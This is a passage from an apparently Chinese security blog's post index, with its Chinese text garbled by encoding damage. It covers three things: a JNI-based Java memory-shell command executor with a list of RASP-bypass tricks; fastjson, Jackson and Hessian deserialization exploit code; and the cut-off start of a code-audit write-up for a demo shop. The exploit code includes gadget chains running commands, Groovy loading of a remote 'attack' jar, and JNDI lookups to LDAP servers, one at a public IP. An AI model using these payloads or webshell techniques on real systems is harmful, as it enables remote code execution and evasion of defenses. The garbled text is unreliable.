(!feof(pipe)) if (fgets(buffer, 256, pipe)) //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­ strcat(result, buffer); pclose(pipe); //å…³é—­ç®¡é“ return 1; //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ JNIEXPORT jstring JNICALL Java_xyz_eki_marshalexp_memshell_SpringBoot_Controller_SpringControllerJNIMemshell_doExec(JNIEnv *env, jobject thisObj,jstring jstr) const char *cstr = env-GetStringUTFChars(jstr, NULL); char result[1024 * 12] = ; //å®šä¹‰å­˜æ”¾ç»“æœçš„å­—ç¬¦ä¸²æ•°ç»„ if (1 == execmd(cstr, result)) // printf(result); char return_messge[256] = ; strcat(return_messge, result); jstring cmdresult = env-NewStringUTF(return_messge); //system(); return cmdresult; JNIEXPORT jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved) return JNI_VERSION_1_4; //è¿™é‡Œå¾ˆé‡è¦ï¼Œå¿…é¡»è¿”å›ç‰ˆæœ¬ï¼Œå¦åˆ™åŠ è½½ä¼šå¤±è´¥ã€‚ ç¼–è¯‘å¹¶è·å– base64 ç¼–ç å†…å®¹ OBJ = SpringControllerJNIMemshell.cppCFLAGS = -shared -fPICCC = gccTARGET = jni.so all: $(CC) -I$JAVA_HOME/include -I$JAVA_HOME/include/linux $(OBJ) $(CFLAGS) -o $(TARGET) clean: rm *.o *.so è·å– base64 cat jni.so | base64 -w 0 è·å– base64 ç¼–ç å†…å®¹åï¼Œå°†å…¶å¡«å……åˆ° jniCodes ä¸­ï¼Œä½¿ç”¨ååºåˆ—åŒ–åˆ©ç”¨é“¾æ‰“å…¥å³å¯ å…¶ä»–ç»•è¿‡æ–¹æ³•å…¶ä»–çš„ç»•è¿‡æ–¹æ³•ç ”ç©¶å¯ä»¥å‚è€ƒæ–‡ç« ï¼šRASPçš„å®‰å…¨æ”»é˜²ç ”ç©¶å®è·µ - admin-ç¥é£ - åšå®¢å›­ï¼Œè¿™é‡Œä»…è¿›è¡Œç½—åˆ—ï¼š ç ´å RASP çš„å¼€å…³ã€‚OpenRASP ä¸­å­˜åœ¨ä¸€ä¸ª hook å¼€å…³ï¼Œåå°„ä¿®æ”¹è¿™ä¸ª hook å¼€å…³å¯å…³é—­æ‰€æœ‰æ‹¦æˆªã€‚Jrasp æ²¡æœ‰æ˜æ˜¾çš„å¼€å…³å¯ä»¥å»æ“æ§ä½†ä½œè€…ä¹Ÿå®ç°çš„ç±»ä¼¼çš„æ•ˆæœã€‚ ç†”æ–­å¼€å…³ã€‚å¾ˆå¤šå•†ä¸šåŒ–çš„äº§å“æœ‰ç±»ä¼¼çš„CPUç†”æ–­æœºåˆ¶ï¼Œå¦‚æœ CPU è¾¾åˆ° 90%ï¼Œå°±è‡ªåŠ¨å…³é—­ Rasp çš„æ‹¦æˆªã€‚å› æ­¤å¯ä»¥é€šè¿‡å‘é€ä¸€äº›å¤§çš„æ•°æ®åŒ…æˆ–è€…æµé‡ï¼Œé€ æˆ CPU çš„å‹åŠ›æ¥è§¦å‘ RASP çš„ç†”æ–­å¼€å…³ ä¼ªè£…æ¶æ„ç±»ã€‚å¾ˆå¤š RASP äº§å“æ˜¯é€šè¿‡å †æ ˆä¿¡æ¯å›æº¯çš„æ–¹å¼æ¥åˆ¤æ–­å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹ä»å“ªé‡Œæ¥ï¼Œä¾‹å¦‚æ£€æµ‹ behinder æ—¶ä¼šåˆ¤æ–­å †æ ˆæ˜¯å¦åŒ…å«net.rebeyond.behinderç±»å¼€å¤´çš„ä¿¡æ¯ã€‚ä½œè€…ç»™å‡ºäº†ä¼ªè£…ç±»åçš„æ–¹æ³•ã€‚ æ–°å»ºçº¿ç¨‹ç»•è¿‡ã€‚æ–°å»ºçº¿ç¨‹å¯ä»¥ç»•è¿‡å †æ ˆæ£€æŸ¥ï¼Œä½†æ— æ³•ç»•è¿‡é»‘ç™½åå•ã€‚ Bootstrap ClassLoader åŠ è½½ç»•è¿‡å†…å­˜é©¬æ£€æµ‹ã€‚æŸäº› RASP åœ¨æ£€æµ‹å†…å­˜é©¬æ—¶ï¼Œé€šè¿‡åˆ¤æ–­å½“å‰ç±»çš„ ClassLoader æ˜¯å¦å­˜åœ¨å¯¹åº”çš„ .class æ–‡ä»¶è½åœ°ï¼Œä½¿ç”¨Instrumentation.appendToBootstrapClassLoaderSearch æ–¹æ³•åŠ è½½çš„ jar åŒ…æ˜¯ä»¥ Bootstrap ClassLoader åŠ è½½çš„ï¼Œå› æ­¤èƒ½å¤Ÿç»•è¿‡æ£€æµ‹ã€‚ é€šè¿‡ Unsafe æ–¹å¼ç»•è¿‡ã€‚Unsafe.allocateInstanceæ–¹æ³•å¯ä»¥å®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡è€Œä¸è°ƒç”¨å®ƒçš„æ„é€ æ–¹æ³•ï¼Œå†å»æ‰§è¡Œå®ƒçš„ Native æ–¹æ³•ï¼Œä»è€Œç»•è¿‡ Rasp çš„æ£€æµ‹ã€‚ä½œè€…ç»™å‡ºçš„ç¤ºä¾‹ä¸­ï¼Œé€šè¿‡ç›´æ¥æ‰§è¡Œ forkAndExec çš„ Native æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤ã€‚ é€šè¿‡ WindowsVirtualMachine æ³¨å…¥ ShellCode åŠ è½½ã€‚å‘è‡ªèº«è¿›ç¨‹æ¤å…¥å¹¶è¿è¡Œ ShellCode ç»•è¿‡ RASP Java è·¨å¹³å°ä»»æ„ Native ä»£ç æ‰§è¡Œã€‚ å¼±å¼•ç”¨ GC. ä¸€ç§ä¾æ‰˜ WeakReference å¼±å¼•ç”¨çš„å‘½ä»¤æ‰§è¡Œæ–¹å¼ï¼Œæœ‰åˆ«äºå¸¸è§„çš„å‘½ä»¤æ‰§è¡Œï¼Œå› æ­¤åœ¨æŸäº›åœºæ™¯ä¸‹å¯ä»¥ç»•è¿‡ã€‚ é«˜æƒé™åœºæ™¯å¸è½½ RASPã€‚é€šè¿‡è·å– tools.jar çš„è·¯å¾„ï¼Œè°ƒç”¨é‡Œé¢çš„ JVM API æ¥å¸è½½ RASP","categories":["javaå†…å­˜é©¬"]},{"title":"javaååºåˆ—åŒ–å°æ€»ç»“","path":"/2025/09/24/javaååºåˆ—åŒ–å°æ€»ç»“/","content":"CCé“¾ CBé“¾ä¸shiro fastjson1.2.24 1.2.47åˆ¤æ–­keyå€¼æ˜¯å¦ä¸º@typeä¹‹ååšäº†ä¸€ä¸ªcheckAutoTypeçš„æ ¡éªŒï¼Œè¢«é»‘åå•æ‹¦æˆª è§£å†³æ–¹æ³•ï¼šå‘ç¼“å­˜ç±»ä¸­æ·»åŠ ä¸€äº›æˆ‘ä»¬çš„æ¶æ„ç±» 1.2.68TypeUtils.loadClass()çš„åœ°æ–¹åŠ å…¥äº†ä¸€ä¸ªcacheå‚æ•°ï¼Œé»˜è®¤ä¸ºfalseï¼Œä¸èƒ½æ·»åŠ ç±» é€šè¿‡checkAutoType()æ ¡éªŒçš„æ–¹å¼æœ‰å“ªäº›ï¼š ç™½åå•é‡Œçš„ç±» å¼€å¯äº†autotype ä½¿ç”¨äº†JSONTypeæ³¨è§£ æŒ‡å®šäº†æœŸæœ›ç±»ï¼ˆexpectClassï¼‰ ç¼“å­˜åœ¨mappingä¸­çš„ç±» ä½¿ç”¨ParserConfig.AutoTypeCheckHandleræ¥å£é€šè¿‡æ ¡éªŒçš„ç±» checkAutoType()ä¸­çš„expectClasså‚æ•°ç±»å‹ä¸ºjava.lang.Classï¼Œå½“expectClassä¼ å…¥checkAutoType()æ—¶ä¸ä¸ºnullï¼Œå¹¶ä¸”æˆ‘ä»¬è¦å®ä¾‹åŒ–çš„ç±»æ˜¯expectClassçš„å­ç±»æˆ–å…¶å®ç°æ—¶ä¼šå°†ä¼ å…¥çš„ç±»è§†ä¸ºä¸€ä¸ªåˆæ³•çš„ç±»ï¼ˆä¸èƒ½åœ¨é»‘åå•ä¸­ï¼‰ï¼Œç„¶åé€šè¿‡loadClassè¿”å›è¯¥ç±»çš„classï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç»•è¿‡checkAutoType() EXP package org.example;import com.alibaba.fastjson.JSON;public class AutoCloseableBypass public static void main(String[] args) JSON.parseObject(\\@type\\:\\java.lang.AutoCloseable\\, \\@type\\:\\org.example.JavaBean\\, \\cmd\\:\\calc.exe\\); JavaBean package org.example;import java.io.IOException;public class JavaBean implements AutoCloseable public JavaBean(String cmd) try Runtime.getRuntime().exec(cmd); catch (IOException e) e.printStackTrace(); @Override public void close() throws Exception 1.2.80åœ¨fastjsonçš„1.2.80ç‰ˆæœ¬ä¸­å¯ä»¥é€šè¿‡å°†ä¾èµ–åŠ å…¥åˆ°java.lang.Exception æœŸæœ›ç±»çš„å­ç±»ä¸­ï¼Œç»•è¿‡checkAutoType package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.JSONObject;public class Poc public static void main(String[] args) String json = + \\@type\\:\\java.lang.Exception\\, + \\@type\\:\\org.codehaus.groovy.control.CompilationFailedException\\, + \\unit\\: + + ; try JSON.parse(json); catch (Exception e) json = + \\@type\\:\\org.codehaus.groovy.control.ProcessingUnit\\, + \\@type\\:\\org.codehaus.groovy.tools.javac.JavaStubCompilationUnit\\, + \\config\\: + \\@type\\: \\org.codehaus.groovy.control.CompilerConfiguration\\, + \\classpathList\\:[\\http://127.0.0.1:8433/attack-1.jar\\] + , + \\gcl\\:null, + \\destDir\\: \\/tmp\\ + ; JSONObject.parse(json); åŸç”Ÿååºåˆ—åŒ–fastjson1.2.48fastjson2fastjson2æµ‹è‡³2.0.26 ä»1.2.49å¼€å§‹ï¼Œæˆ‘ä»¬çš„JSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹çœŸæ­£æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³• åœ¨å…¶SecureObjectInputStreamç±»å½“ä¸­é‡å†™äº†resolveClass,åœ¨å…¶ä¸­è°ƒç”¨äº†checkAutoTypeæ–¹æ³•åšç±»çš„æ£€æŸ¥ fastjson1åœ¨å“ªäº›æƒ…å†µä¸‹readObjectçš„æ—¶å€™ä¸ä¼šè°ƒç”¨resolveClassï¼Œç­”æ¡ˆå°±æ˜¯å¼•ç”¨ å¦‚ä½•åœ¨JSONArrayJSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥,ç­”æ¡ˆæ˜¯å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ å› æ­¤æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ€è·¯æ„å»ºæ”»å‡»çš„payloadäº†ï¼Œè¿™é‡Œç®€å•ä»¥ä¼ªä»£ç å‘ˆç°ï¼Œä¾¿äºç†è§£æ€è·¯ TemplatesImpl templates = TemplatesImplUtil.getEvilClass(open -na Calculator);ArrayListObject arrayList = new ArrayList();arrayList.add(templates);JSONArray jsonArray = new JSONArray();jsonArray.add(templates);BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);arrayList.add(bd); WriteObjects(arrayList); ç®€å•æ¢³ç†ä¸‹ åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArrayJSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArrayJSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArrayJSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡ import com.alibaba.fastjson.JSONArray;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.util.HashMap;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;public class Y4HackJSON public static void setValue(Object obj, String name, Object value) throws Exception Field field = obj.getClass().getDeclaredField(name); field.setAccessible(true); field.set(obj, value); public static byte[] genPayload(String cmd) throws Exception ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.makeClass(a); CtClass superClass = pool.get(AbstractTranslet.class.getName()); clazz.setSuperclass(superClass); CtConstructor constructor = new CtConstructor(new CtClass[], clazz); constructor.setBody(Runtime.getRuntime().exec(\\+cmd+\\);); clazz.addConstructor(constructor); clazz.getClassFile().setMajorVersion(49); return clazz.toBytecode(); public static void main(String[] args) throws Exception TemplatesImpl templates = TemplatesImpl.class.newInstance(); setValue(templates, _bytecodes, new byte[][]genPayload(open -na Calculator)); setValue(templates, _name, 1); setValue(templates, _tfactory, null); JSONArray jsonArray = new JSONArray(); jsonArray.add(templates); BadAttributeValueExpException bd = new BadAttributeValueExpException(null); setValue(bd,val,jsonArray); HashMap hashMap = new HashMap(); hashMap.put(templates,bd); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(hashMap); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); objectInputStream.readObject(); é«˜ç‰ˆæœ¬çš„ä¸€äº›ç»•è¿‡jdk17çš„æ—¶å€™å‘ç°BadAttributeValueExpException.readObject()æ— æ³•ä½œä¸ºsourceï¼Œå› æ­¤å°±éœ€è¦æ‰¾å…¶ä»–çš„è§¦å‘toString()çš„é“¾æ‹¼èµ·æ¥ EventListenerList.readObject() - UndoManager#toString() -Vector#toString() åˆ©ç”¨ä»£ç  Vector vector = new Vector();vector.add(jsonArray);UndoManager undoManager = new UndoManager();setField(undoManager,edits,vector);EventListenerList eventListenerList = new EventListenerList();setField(eventListenerList,listenerList,new Object[]Class.class,undoManager);unser(ser(eventListenerList)); HashMap#readObject()-putVal()-equals()-XString.equals()-toString() è‡ªå·±å†™äº†ä¸ªæ–¹æ³• public static HashMap getXString(Object obj) throws Exception //objä¼ å…¥å¾…è§¦å‘toString()çš„ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µæŠŠXStringæ¢äº†ï¼Œç”¨æ¥æ¥ä»»æ„equals XString xstring=new XString(); HashMap hashMap1 = new HashMap(); HashMap hashMap2 = new HashMap(); hashMap1.put(zZ,obj); hashMap1.put(yy,xstring); hashMap2.put(zZ,xstring); hashMap2.put(yy,obj); HashMap hashMap = new HashMap(); hashMap.put(hashMap1, 1); hashMap.put(hashMap2, 2); setHashMapKey(hashMap,hashMap1,hashMap1);//é¿å…æå‰è§¦å‘æŠ›å¼‚å¸¸å¯¼è‡´ç¨‹åºæ— æ³•ç»§ç»­è¿›è¡Œ setHashMapKey(hashMap,hashMap2,hashMap2); return hashMap; HashMap#readObject - HotSwappableTargetSource#equals - XString#equals - toString public static void main(String[] args) throws Exception JSONArray jsonArray = new JSONArray(); jsonArray.add(getTemplates()); unser(ser(getHotSwappableTargetSource(jsonArray))); public static HashMap getHotSwappableTargetSource(Object obj) throws Exception HotSwappableTargetSource hotSwappableTargetSource1 = new HotSwappableTargetSource(obj); HotSwappableTargetSource hotSwappableTargetSource2 = new HotSwappableTargetSource(new XString(x)); HashMap hashMap = new HashMap(); hashMap.put(1, hotSwappableTargetSource1); hashMap.put(2, hotSwappableTargetSource2); setHashMapKey(hashMap,1,hotSwappableTargetSource1); setHashMapKey(hashMap,2,hotSwappableTargetSource2); return hashMap; é«˜ç‰ˆæœ¬ï¼ˆ2.0.26ï¼‰ç»•è¿‡é»‘åå•ç»•è¿‡ åŠ¨æ€ä»£ç†ç»•è¿‡ JdkDynamicAopProxy AutowireUtils$ObjectFactoryDelegatingInvocationHandler jacksoné€šæ€2.10 åˆ©ç”¨Jacksonä¸­çš„PojoNode ä»–çš„toStringæ˜¯å¯ä»¥ç›´æ¥è§¦å‘ä»»æ„çš„getterçš„ è§¦å‘æ¡ä»¶å¦‚ä¸‹ ä¸éœ€è¦å­˜åœ¨è¯¥å±æ€§ getteræ–¹æ³•éœ€è¦æœ‰è¿”å›å€¼ å°½å¯èƒ½çš„åªæœ‰ä¸€ä¸ªgetter ROME Hessianæ¼æ´ç‚¹åœ¨äºHessianå¯¹äºMapçš„ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œä¼šå°†ååºåˆ—åŒ–è¿‡åçš„é”®å€¼å¯¹putè¿›mapä¸­ Apache Dubbo Hessian2 å¼‚å¸¸å¤„ç†æ—¶ååºåˆ—åŒ–ï¼ˆCVE-2021-43297ï¼‰ JNDIç»•è¿‡jdké«˜ç‰ˆæœ¬trustURLCodebaseé™åˆ¶é«˜ç‰ˆæœ¬çš„JDKæœ‰JNDIé™åˆ¶çš„åŸå› æ˜¯trustURLCodebaseé»˜è®¤ä¸ºfalse java.lang.System#setPropertyæ–¹æ³•ç”¨äºè®¾ç½®ç³»ç»Ÿå±æ€§ã€‚è¯¥æ–¹æ³•å…è®¸åœ¨è¿è¡Œæ—¶æ›´æ”¹ç³»ç»Ÿçš„å±æ€§å€¼ã€‚ æˆ‘ä»¬å¯ä»¥æ­¤æ–¹æ³•å°†å¯¹åº”ç‰ˆæœ¬çš„trustURLCodebaseè®¾ç½®ä¸ºtrueï¼Œç»•è¿‡JNDIé™åˆ¶ æœ€åè°ƒç”¨çš„æ˜¯JdbcRowSetImpl.getDatabaseMetaData() Method invokeMethod = MethodUtil.class.getMethod(invoke, Method.class, Object.class, Object[].class);// Method execMethod = Runtime.class.getDeclaredMethod(exec, String.class); Method jndiMethod = JdbcRowSetImpl.class.getMethod(getDatabaseMetaData); Method setPropertyMethod = System.class.getDeclaredMethod(setProperty, String.class, String.class); MimeTypeParameterList mimeTypeParameterList0 = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults0 = new UIDefaults(); SwingLazyValue swingLazyValue0 = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]setPropertyMethod,new Object(),new Object[]com.sun.jndi.ldap.object.trustURLCodebase,true);// System.setProperty(com.sun.jndi.ldap.object.trustURLCodebase,true); Field field = BaseRowSet.class.getDeclaredField(dataSource); field.setAccessible(true); JdbcRowSetImpl jdbcRowSet = createObjWithoutConstructor(JdbcRowSetImpl.class); field.set(jdbcRowSet,ldap://127.0.0.1:8085/evil);// jdbcRowSet.getDatabaseMetaData(); MimeTypeParameterList mimeTypeParameterList = createObjWithoutConstructor(MimeTypeParameterList.class); UIDefaults defaults = new UIDefaults(); SwingLazyValue swingLazyValue = new SwingLazyValue(sun.reflect.misc.MethodUtil,invoke,new Object[]invokeMethod,new Object(),new Object[]jndiMethod,jdbcRowSet,new Object[]); defaults0.put(777,swingLazyValue0); defaults.put(1,swingLazyValue); setField(mimeTypeParameterList0,parameters,defaults0); setField(mimeTypeParameterList,parameters,defaults);// System.out.println(mimeTypeParameterList); try String s0 = ser(mimeTypeParameterList0); System.out.println(s0); unser(s0); finally String s = ser(mimeTypeParameterList); System.out.println(s); unser(s); æœ€åè°ƒç”¨çš„æ˜¯InitialContext.doLookup package com.Hessian; import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import sun.swing.SwingLazyValue;import javax.activation.MimeTypeParameterList;import javax.swing.*;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.lang.reflect.Field;import java.lang.reflect.Method; public class EXP4 public static void main(String[] args) throws Exception UIDefaults uiDefaults1 = new UIDefaults(); UIDefaults uiDefaults2 = new UIDefaults(); Method setProperty = Class.forName(java.lang.System).getDeclaredMethod(setProperty, String.class, String.class); Method invokeMethod = Class.forName(sun.reflect.misc.MethodUtil).getDeclaredMethod(invoke, Method.class, Object.class, Object[].class); SwingLazyValue slz1 = new SwingLazyValue(sun.reflect.misc.MethodUtil, invoke, new Object[]invokeMethod, new Object(), new Object[]setProperty, new Object(), new Object[]com.sun.jndi.ldap.object.trustURLCodebase, true); Method doLookup = Class.forName(javax.naming.InitialContext).getDeclaredMethod(doLookup, String.class); SwingLazyValue slz2 = new SwingLazyValue(sun.reflect.misc.MethodUtil, invoke, new Object[]invokeMethod, new Object(), new Object[]doLookup, new Object(), new Object[]ldap://124.222.136.33:1337/#suibian); uiDefaults1.put(xxx, slz1); MimeTypeParameterList mimeTypeParameterList1 = new MimeTypeParameterList(); setFieldValue(mimeTypeParameterList1, parameters, uiDefaults1); uiDefaults2.put(xxx, slz2); MimeTypeParameterList mimeTypeParameterList2 = new MimeTypeParameterList(); setFieldValue(mimeTypeParameterList2, parameters, uiDefaults2); try ser(mimeTypeParameterList1); catch (Exception e) ser(mimeTypeParameterList2); public static void ser(Object evil) throws Exception ByteArrayOutputStream baos = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(baos); output.getSerializerFactory().setAllowNonSerializable(true); //å…è®¸ååºåˆ—åŒ–NonSerializable baos.write(67); output.writeObject(evil); output.flushBuffer(); ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); Hessian2Input input = new Hessian2Input(bais); input.readObject(); public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); hibernate jndi","categories":["javaååºåˆ—åŒ–"]},{"title":"ä»£ç å®¡è®¡-ä»¿å¤©çŒ«å•†åŸ","path":"/2025/09/20/ä»£ç å®¡è®¡-ä»¿å¤©çŒ«å•†åŸ/","content":"å‰è¨€Springbooté¡¹ç›®ä»¿å¤©çŒ«å•†åŸ ï¼šå‰å°jspé¡µé¢ï¼ˆå‰åç«¯åœ¨ä¸€èµ·ï¼‰ï¼Œmysqlæ•°æ®åº“ï¼Œjdk1.8 é¡¹ç›®åœ°å€ï¼šhttps://gitee.com/HaiTao87/TmallDemo ç¯å¢ƒæ­å»ºæŒ‰ç…§é¡¹ç›®é‡Œé¢è¯´çš„éƒ¨ç½²æ–¹å¼è¿›è¡Œéƒ¨ç½²å°±å®Œäº‹äº†ï¼Œä¸‹é¢æˆ‘åªè¦åˆ†äº«å‡ ç‚¹æˆ‘è‡ªå·±æ­å»ºç¯å¢ƒè¿‡ç¨‹ä¸­æ‰€é‡åˆ°çš„æŠ¥é”™çš„è§£å†³æ–¹æ¡ˆ 20:28:33.382 [restartedMain] ERROR org.springframework.boot.SpringApplication - Application run failedjava.lang.IllegalStateException: Failed to load property source from location classpath:/application.yml\tat org.springframework.boot.context.config.ConfigFileApplicationListener$Loader.load(ConfigFileApplicationListener.java:524).......Caused by: java.nio.charset.MalformedInputException: Input length = 1\tat java.nio.charset.CoderResult.throwException(CoderResult.java:281)\tat sun.nio.cs.StreamDecoder.implRead(StreamDecoder.java:339)\tat sun.nio.cs.StreamDecoder.read(StreamDecoder.java:178)\tat java.io.InputStreamReader.read(InputStreamReader.java:184)\tat org.yaml.snakeyaml.reader.UnicodeReader.read(UnicodeReader.java:125)\tat org.yaml.snakeyaml.reader.StreamReader.update(StreamReader.java:183)\t... 46 common frames omitted è¿™ä¸»è¦æ˜¯è¯´æ˜äº† application.ymlæ–‡ä»¶å¯èƒ½æ˜¯åœ¨æŸäº›ç¼–è¾‘å™¨ï¼ˆå¦‚ Windows è®°äº‹æœ¬ï¼‰ä¸­ä»¥ GBK æˆ–å…¶å®ƒé UTF-8 ç¼–ç ä¿å­˜çš„ï¼Œè€Œ Spring Boot é»˜è®¤ä½¿ç”¨ UTF-8 ç¼–ç æ¥è¯»å–é…ç½®æ–‡ä»¶ æ‰€ä»¥æˆ‘éªŒè¯çš„æ–¹å¼æ˜¯ç”¨HxDè¿™ä¸ªè½¯ä»¶æ¥æ‰“å¼€ application.ymlæ–‡ä»¶ï¼Œçœ‹åˆ°äº†ä¸­æ–‡å…¨éƒ¨éƒ½æ˜¯ä»¥ä¹±ç çš„å½¢å¼æ˜¾ç¤ºï¼Œè§£å†³çš„åŠæ³•æœ€ç®€å•çš„å°±æ˜¯ç›´æ¥å°† application.ymlå’Œapplication-dev.ymlä¸­çš„æ‰€æœ‰ä¸­æ–‡æ³¨é‡Šéƒ½åˆ æ‰å°±å¯ä»¥äº† åœ¨å¯åŠ¨é¡¹ç›®çš„æ—¶å€™è¿˜ä¼šé‡åˆ°ä¸€ä¸ªæŠ¥é”™å¦‚ä¸‹ï¼š E:\\safety\\CodeAudit\\TmallDemo-master\\src\\test\\java\\com\\example\\tmall\\TmallApplicationTests.java:3:29java: æ— æ³•è®¿é—®org.junit.jupiter.api.Test é”™è¯¯çš„ç±»æ–‡ä»¶: /C:/Users/BD/.m2/repository/org/junit/jupiter/junit-jupiter-api/6.0.0-M2/junit-jupiter-api-6.0.0-M2.jar!/org/junit/jupiter/api/Test.class ç±»æ–‡ä»¶å…·æœ‰é”™è¯¯çš„ç‰ˆæœ¬ 61.0, åº”ä¸º 52.0 è¯·åˆ é™¤è¯¥æ–‡ä»¶æˆ–ç¡®ä¿è¯¥æ–‡ä»¶ä½äºæ­£ç¡®çš„ç±»è·¯å¾„å­ç›®å½•ä¸­ã€‚ è¿™æ˜¯javaç‰ˆæœ¬ä¸å…¼å®¹çš„é—®é¢˜ï¼Œé¡¹ç›®é‡Œé¢è¯¥åº“ç”¨çš„æ˜¯java17çš„ç‰ˆæœ¬ï¼Œä½†ç›®å‰ç¼–è¯‘å’Œè¿è¡Œè¯¥é¡¹ç›®çš„æ˜¯java8 æˆ‘çš„è§£å†³æ–¹æ³•æ˜¯æ›´æ”¹pom.xmlé‡Œé¢ä¾èµ–çš„ç‰ˆæœ¬ dependency groupIdorg.junit.jupiter/groupId artifactIdjunit-jupiter-api/artifactId version5.9.3/version scopetest/scope/dependency åé¢ç™»å½•ç®¡ç†åå°çš„æ—¶å€™ä¹Ÿä¼šæŠ¥é”™å¦‚ä¸‹ Whitelabel Error PageThis application has no explicit mapping for /error, so you are seeing this as a fallback.Thu Sep 18 21:04:32 CST 2025There was an unexpected error (type=Internal Server Error, status=500).### Error querying database. Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column tmalldemodb.productOrder.productorder_pay_date which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by ### The error may exist in file [E:\\safety\\CodeAudit\\TmallDemo-master\\target\\classes\\mapper\\ProductOrderMapper.xml] ### The error may involve defaultParameterMap ### The error occurred while setting parameters ### SQL: SELECT productOrder_pay_date,count(productOrder_id) as productOrder_count ,productOrder_status from productOrder WHERE productOrder_pay_date BETWEEN ? AND ? GROUP BY DATE_FORMAT(productOrder_pay_date,%Y-%m-%d),productOrder_status ### Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column tmalldemodb.productOrder.productorder_pay_date which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by ; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column tmalldemodb.productOrder.productorder_pay_date which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_byorg.springframework.jdbc.BadSqlGrammarException: ### Error querying database. Cause: java.sql.SQLSyntaxErrorException: Expression #1 of SELECT list is not in GROUP BY clause and contains nonaggregated column tmalldemodb.productOrder.productorder_pay_date which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by### The error may exist in file [E:\\safety\\CodeAudit\\TmallDemo-master\\target\\classes\\mapper\\ProductOrderMapper.xml]........ ä¸çŸ¥é“è¿™ä¸ªæŠ¥é”™æ˜¯ä¸æ˜¯å’Œæˆ‘ä¸Šé¢æ”¹äº†ä¸€ä¸ªä¾èµ–çš„ç‰ˆæœ¬æœ‰å…³ã€‚ã€‚ã€‚ã€‚ è¯¥æŠ¥é”™çš„æ ¸å¿ƒåœ¨äºä½ çš„ SQL æŸ¥è¯¢è¯­å¥çš„å†™æ³• ä¸ä½ ä½¿ç”¨çš„ MySQL ç‰ˆæœ¬é»˜è®¤çš„ä¸¥æ ¼æ¨¡å¼ ä¸å…¼å®¹ ä¸‹é¢æ˜¯æˆ‘çš„è§£å†³æ–¹æ¡ˆ select id=getTotalByDate resultType=com.xq.tmall.entity.OrderGroup SELECT 